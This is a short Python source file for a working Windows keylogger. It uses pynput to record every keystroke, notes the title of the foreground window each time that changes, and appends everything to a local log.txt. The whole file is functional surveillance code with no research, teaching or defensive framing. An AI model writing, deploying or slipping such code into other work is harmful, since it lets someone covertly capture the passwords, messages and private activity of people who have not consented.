from ctypes import windll, create_unicode_buffer
from pynput import keyboard

def get_foreground_window():
    hwnd = windll.user32.GetForegroundWindow()
    length = windll.user32.GetWindowTextLengthW(hwnd)
    buf = create_unicode_buffer(length + 1)
    windll.user32.GetWindowTextW(hwnd, buf, length + 1)
    return buf.value

fg_win = get_foreground_window() # initial file

def on_press(key):
    global fg_win
    with open("log.txt", "a") as f:
        # update the foreground window
        new_fg_win = get_foreground_window()
        if fg_win != new_fg_win: 
            f.write("\n" + str(new_fg_win.encode("utf-8")) + "\n")
            fg_win = new_fg_win

        f.write(str(key))
              

with keyboard.Listener(on_press=on_press) as listener:
    # clear the file for each running
    with open("log.txt", "w") as f:
        f.write("")
    listener.join()